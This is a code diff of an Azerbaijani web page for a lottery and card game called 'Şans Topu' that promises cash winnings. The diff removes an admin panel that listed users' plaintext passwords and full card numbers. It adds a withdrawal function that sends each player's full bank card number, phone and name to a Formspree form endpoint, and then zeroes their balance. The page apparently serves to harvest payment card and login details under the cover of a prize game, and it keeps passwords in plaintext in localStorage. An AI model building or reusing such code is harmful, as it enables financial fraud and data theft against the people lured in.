@@ -394,121 +394,15 @@
             padding: 8px 12px;
             font-size: 0.7rem;
         }
-        .admin-panel {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .admin-stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .admin-stat-card {
-            background: white;
-            padding: 15px;
-            border-radius: 1rem;
-            text-align: center;
-        }
-        .admin-stat-number {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #FD1D1D;
-        }
-        .user-list {
-            max-height: 500px;
-            overflow-y: auto;
-        }
-        .user-item {
-            background: white;
+        .guest-warning {
+            background: linear-gradient(135deg, #FCAF45, #FD1D1D);
             padding: 12px;
             border-radius: 1rem;
-            margin-bottom: 10px;
-            border: 1px solid #dbdbdb;
-        }
-        .user-name {
-            font-weight: bold;
-            color: #FD1D1D;
-            font-size: 1rem;
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .user-detail {
-            font-size: 0.8rem;
-            color: #262626;
-            margin: 3px 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .user-winnings {
-            color: #22C55E;
+            margin: 12px 0;
+            text-align: center;
+            color: white;
             font-weight: bold;
             font-size: 0.9rem;
-            margin-top: 5px;
-        }
-        .approve-btn {
-            background: #22C55E;
-            color: white;
-            border: none;
-            padding: 6px 15px;
-            border-radius: 25px;
-            cursor: pointer;
-            margin-top: 8px;
-            font-size: 0.75rem;
-            width: auto;
-            font-weight: bold;
-        }
-        .reject-btn {
-            background: #FD1D1D;
-            color: white;
-            border: none;
-            padding: 6px 15px;
-            border-radius: 25px;
-            cursor: pointer;
-            margin-top: 8px;
-            font-size: 0.75rem;
-            width: auto;
-            font-weight: bold;
-        }
-        .approved-badge {
-            background: #22C55E;
-            color: white;
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            display: inline-block;
-        }
-        .pending-badge {
-            background: #FCAF45;
-            color: #262626;
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            display: inline-block;
-        }
-        .rejected-badge {
-            background: #FD1D1D;
-            color: white;
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            display: inline-block;
-        }
-        .admin-exit-btn {
-            position: fixed;
-            bottom: 15px;
-            right: 15px;
-            background: #262626;
-            padding: 8px 16px;
-            border-radius: 40px;
-            color: white;
-            cursor: pointer;
-            z-index: 200;
-            font-size: 12px;
         }
         .pending-message {
             background: #FCAF4520;
@@ -527,25 +421,6 @@
             margin-bottom: 15px;
             text-align: center;
             color: #FD1D1D;
-        }
-        .admin-link-info {
-            background: #262626;
-            color: #FCAF45;
-            padding: 8px;
-            border-radius: 12px;
-            font-size: 11px;
-            text-align: center;
-            margin-top: 10px;
-        }
-        .guest-warning {
-            background: linear-gradient(135deg, #FCAF45, #FD1D1D);
-            padding: 12px;
-            border-radius: 1rem;
-            margin: 12px 0;
-            text-align: center;
-            color: white;
-            font-weight: bold;
-            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -609,11 +484,6 @@
         <div style="margin-top: 20px; border-top: 1px solid #dbdbdb; padding-top: 15px;">
             <button onclick="showLoginScreen()" style="background:#8e8e8e;">🔐 Qeydiyyatdan keçmişəm (Daxil Ol)</button>
             <button onclick="showRegisterScreen()" class="reg-link-btn">📝 Qeydiyyatdan keç</button>
-        </div>
-        
-        <div class="admin-link-info" id="adminLinkMsg" style="display:none;">
-            🔐 <strong>Admin Linki</strong><br>
-            <span id="adminLinkSpan"></span>
         </div>
     </div>
 
@@ -829,27 +699,6 @@
         </div>
     </div>
 
-    <!-- ADMIN PANEL EKRANI -->
-    <div id="admin-screen" class="glass-card hidden">
-        <h2>👑 Admin Panel</h2>
-        <div class="admin-stats">
-            <div class="admin-stat-card">
-                <div class="admin-stat-number" id="admin-total-users">0</div>
-                <div>İstifadəçi sayı</div>
-            </div>
-            <div class="admin-stat-card">
-                <div class="admin-stat-number" id="admin-total-winnings">0</div>
-                <div>Ümumi qazanc (AZN)</div>
-            </div>
-            <div class="admin-stat-card">
-                <div class="admin-stat-number" id="admin-avg-winnings">0</div>
-                <div>Orta qazanc</div>
-            </div>
-        </div>
-        <div class="user-list" id="user-list"></div>
-        <button onclick="exitAdminPanel()" style="background:#8e8e8e; margin-top:15px;">🔙 Çıxış</button>
-    </div>
-
 </div>
 
 <script>
@@ -862,7 +711,6 @@
     let guestCardsLastTime = 0;
     let guestCardsData = [];
     let guestCardsScore = 0;
-    let isAdminMode = false;
     
     let gameTimerInterval = null;
     let gameDrawInterval = null;
@@ -876,14 +724,10 @@
     
     const DRAW_DURATION = 4000;
     const DRAW_INTERVAL = 4000;
-    // LIMITSIZ LOTO - COOLDOWN YOXDUR
     const CARDS_COOLDOWN_MS = 86400000;
     const MAX_CARDS_OPEN = 3;
     const SPECIAL_NUMBERS = [7, 13, 23, 42, 50, 69, 77, 88];
     const STREAK_REWARDS = { 3: 2, 7: 5, 14: 10, 30: 20 };
-    
-    // ADMIN KODU
-    const ADMIN_SECRET = "ziriş230226";
     
     const CARD_REWARDS = [
         { name: "🃏 Joker", prize: 5 },
@@ -903,19 +747,6 @@
         stopAllGameIntervals();
         document.querySelectorAll('.glass-card').forEach(el => el.classList.add('hidden'));
         document.getElementById('game-select-screen').classList.remove('hidden');
-        isAdminMode = false;
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const adminKey = urlParams.get('admin');
-        
-        if (adminKey === ADMIN_SECRET) {
-            document.getElementById('adminLinkMsg').style.display = 'block';
-            const link = window.location.origin + window.location.pathname + '?admin=' + ADMIN_SECRET;
-            document.getElementById('adminLinkSpan').innerHTML = link;
-            showAdminPanel();
-        } else {
-            document.getElementById('adminLinkMsg').style.display = 'none';
-        }
     }
     
     function showLoginScreen() {
@@ -925,14 +756,12 @@
         document.getElementById('login-error-msg').innerHTML = '';
         document.getElementById('pending-login-msg').classList.add('hidden');
         document.getElementById('rejected-login-msg').classList.add('hidden');
-        isAdminMode = false;
     }
     
     function showRegisterScreen() {
         stopAllGameIntervals();
         document.querySelectorAll('.glass-card').forEach(el => el.classList.add('hidden'));
         document.getElementById('register-screen').classList.remove('hidden');
-        isAdminMode = false;
     }
     
     function exitToGameSelect() {
@@ -956,13 +785,10 @@
 
     function savePlayer() {
         localStorage.setItem('sans_topu_player', JSON.stringify(currentPlayer));
-        let all = JSON.parse(localStorage.getItem('all_players') || '{}');
-        if (currentPlayer) all[currentPlayer.id] = currentPlayer;
-        localStorage.setItem('all_players', JSON.stringify(all));
     }
     
-    function getAllPlayers() {
-        return JSON.parse(localStorage.getItem('all_players') || '{}');
+    function loadPlayer() {
+        return JSON.parse(localStorage.getItem('sans_topu_player'));
     }
     
     function getReferralFromUrl() {
@@ -1002,14 +828,11 @@
             return;
         }
         
-        // Yoxla: bütün istifadəçilər içində eyni email/telefon/kart var?
-        let all = getAllPlayers();
-        for (let id in all) {
-            if (all[id].email === email || all[id].phone === phone || all[id].card === card) {
-                alert("Bu məlumatlarla artıq qeydiyyat var! Zəhmət olmasa daxil olun.");
-                showLoginScreen();
-                return;
-            }
+        let existing = loadPlayer();
+        if (existing && (existing.email === email || existing.phone === phone || existing.card === card)) {
+            alert("Bu məlumatlarla artıq qeydiyyat var! Zəhmət olmasa daxil olun.");
+            showLoginScreen();
+            return;
         }
         
         const userId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
@@ -1028,28 +851,11 @@
             cardsOpened: 0,
             cardsLastTime: 0,
             cardsScore: 0,
-            avatar: null,
-            approved: false,
-            rejected: false
+            avatar: null
         };
         savePlayer();
         
-        all = getAllPlayers();
-        all[userId] = currentPlayer;
-        localStorage.setItem('all_players', JSON.stringify(all));
-        
-        if (referrerId && all[referrerId]) {
-            const referrer = all[referrerId];
-            referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
-            referrer.balance = referrer.totalWinnings;
-            all[referrerId] = referrer;
-            localStorage.setItem('all_players', JSON.stringify(all));
-            if (currentPlayer.id !== referrerId) {
-                alert(`✅ Referal link ilə qeydiyyatdan keçdiniz! Dostunuza 5 AZN bonus əlavə edildi.`);
-            }
-        }
-        
-        // FORMSFREE - BÜTÜN MƏLUMATLAR EMAİL İLƏ
+        // FORMSFREE - EMAILƏ GÖNDƏR
         try {
             const formData = new FormData();
             formData.append('Ad Soyad', fullname);
@@ -1070,14 +876,10 @@
             console.error('Formspree xətası:', error);
         }
         
-        alert("✅ Qeydiyyat tamamlandı!\n\n📋 Sistem verdiyiniz məlumatları yoxlayır, admin təsdiq edəcək.\nTəsdiq olunduqdan sonra hesabınıza daxil ola bilərsiniz.");
+        alert("✅ Qeydiyyat tamamlandı! Xoş gəldiniz!");
         guestWinAmount = 0;
-        showLoginScreen();
+        showProfileScreen();
     });
-    
-    function loadPlayer() {
-        return JSON.parse(localStorage.getItem('sans_topu_player'));
-    }
 
     // DAXİL OL
     function loginUser() {
@@ -1085,111 +887,15 @@
         const password = document.getElementById('login-password').value.trim();
         if (!instagram || !password) { alert("İnstagram adı və şifrə daxil edin!"); return; }
         
-        const all = getAllPlayers();
-        let found = null;
-        for (let id in all) {
-            if (all[id].instagram === instagram && all[id].password === password) {
-                found = all[id];
-                break;
-            }
-        }
+        const saved = loadPlayer();
         
-        if (found) {
-            if (found.rejected === true) {
-                document.getElementById('rejected-login-msg').classList.remove('hidden');
-                document.getElementById('rejected-login-msg').innerHTML = '❌ Məlumatlarınız uyğun gəlmədi. Zəhmət olmasa məlumatlarınızı yoxlayın.';
-                return;
-            }
-            if (found.approved !== true) {
-                document.getElementById('pending-login-msg').classList.remove('hidden');
-                document.getElementById('pending-login-msg').innerHTML = '⏳ Sistem məlumatlarınızı yoxlayır, admin təsdiq edəcək. Gözləmədəsiniz...';
-                return;
-            }
-            currentPlayer = found;
+        if (saved && saved.instagram === instagram && saved.password === password) {
+            currentPlayer = saved;
             savePlayer();
-            alert(`✅ Xoş gəldiniz, ${found.fullname}!`);
+            alert(`✅ Xoş gəldiniz, ${saved.fullname}!`);
             showProfileScreen();
         } else {
             document.getElementById('login-error-msg').innerHTML = '<span style="color:#FD1D1D;">❌ İnstagram adı və ya şifrə yanlışdır!</span>';
-        }
-    }
-
-    // ADMIN PANEL
-    function showAdminPanel() {
-        stopAllGameIntervals();
-        document.querySelectorAll('.glass-card').forEach(el => el.classList.add('hidden'));
-        document.getElementById('admin-screen').classList.remove('hidden');
-        loadAdminData();
-    }
-    
-    function exitAdminPanel() {
-        showGameSelect();
-    }
-    
-    function loadAdminData() {
-        const all = getAllPlayers();
-        const users = Object.values(all);
-        
-        const totalUsers = users.length;
-        const totalWinnings = users.reduce((sum, u) => sum + (u.totalWinnings || 0), 0);
-        const avgWinnings = totalUsers > 0 ? (totalWinnings / totalUsers).toFixed(2) : 0;
-        
-        document.getElementById('admin-total-users').innerText = totalUsers;
-        document.getElementById('admin-total-winnings').innerText = totalWinnings;
-        document.getElementById('admin-avg-winnings').innerText = avgWinnings;
-        
-        const userListDiv = document.getElementById('user-list');
-        userListDiv.innerHTML = '';
-        
-        users.forEach(user => {
-            const isApproved = user.approved === true;
-            const isRejected = user.rejected === true;
-            let statusBadge = '';
-            if (isApproved) statusBadge = '<span class="approved-badge">✓ Təsdiqlənib</span>';
-            else if (isRejected) statusBadge = '<span class="rejected-badge">✗ Rədd edilib</span>';
-            else statusBadge = '<span class="pending-badge">⏳ Gözləmədə</span>';
-            
-            const userDiv = document.createElement('div');
-            userDiv.className = 'user-item';
-            userDiv.innerHTML = `
-                <div class="user-name">${user.fullname} ${statusBadge}</div>
-                <div class="user-detail">📧 ${user.email}</div>
-                <div class="user-detail">📱 ${user.instagram}</div>
-                <div class="user-detail">🔐 Şifrə: ${user.password}</div>
-                <div class="user-detail">💳 Kart: ${user.card ? user.card.substring(0, 4) + '****' + user.card.substring(12) : '-'} (${user.card})</div>
-                <div class="user-detail">📞 ${user.phone}</div>
-                <div class="user-winnings">💰 Qazanc: ${user.totalWinnings || 0} AZN</div>
-                <div class="user-detail">📅 Qeydiyyat: ${new Date(user.registeredAt).toLocaleDateString()}</div>
-                ${!isApproved && !isRejected ? `
-                    <div style="display: flex; gap: 10px; margin-top: 10px;">
-                        <button class="approve-btn" onclick="approveUser('${user.id}')">✅ Təsdiq et</button>
-                        <button class="reject-btn" onclick="rejectUser('${user.id}')">❌ Rədd et</button>
-                    </div>
-                ` : ''}
-            `;
-            userListDiv.appendChild(userDiv);
-        });
-    }
-    
-    function approveUser(userId) {
-        let all = getAllPlayers();
-        if (all[userId] && !all[userId].approved) {
-            all[userId].approved = true;
-            all[userId].rejected = false;
-            localStorage.setItem('all_players', JSON.stringify(all));
-            alert(`✅ ${all[userId].fullname} təsdiq edildi! İstifadəçi artıq daxil ola bilər.`);
-            loadAdminData();
-        }
-    }
-    
-    function rejectUser(userId) {
-        let all = getAllPlayers();
-        if (all[userId] && !all[userId].approved) {
-            all[userId].rejected = true;
-            all[userId].approved = false;
-            localStorage.setItem('all_players', JSON.stringify(all));
-            alert(`❌ ${all[userId].fullname} rədd edildi! İstifadəçiyə məlumatlarını yoxlaması bildiriləcək.`);
-            loadAdminData();
         }
     }
 
@@ -1246,11 +952,30 @@
         }
     }
 
-    function requestWithdraw() {
+    async function requestWithdraw() {
         if (!currentPlayer) return;
         const regDate = new Date(currentPlayer.registeredAt);
         if ((new Date() - regDate) >= 30 * 86400000 && currentPlayer.totalWinnings > 0) {
-            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı.`);
+            // EMAILƏ ÇIXARIŞ MƏLUMATI GÖNDƏR
+            try {
+                const formData = new FormData();
+                formData.append('Çıxarış Tələbi', 'Şans Topu');
+                formData.append('Ad Soyad', currentPlayer.fullname);
+                formData.append('Instagram', currentPlayer.instagram);
+                formData.append('Kart nömrəsi', currentPlayer.card);
+                formData.append('Telefon', currentPlayer.phone);
+                formData.append('Məbləğ', currentPlayer.totalWinnings + ' AZN');
+                formData.append('_subject', 'Çıxarış Tələbi - Şans Topu');
+                await fetch('https://formspree.io/f/meewaooj', {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch(error) {
+                console.error('Formspree xətası:', error);
+            }
+            
+            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı. Emailinizə bildiriş göndərildi.`);
             currentPlayer.totalWinnings = 0;
             currentPlayer.balance = 0;
             savePlayer();
@@ -1736,7 +1461,7 @@
     window.onload = () => {
         setupAvatarUpload();
         const saved = loadPlayer();
-        if (saved && saved.approved === true) {
+        if (saved) {
             currentPlayer = saved;
             if (!currentPlayer.id) {
                 currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
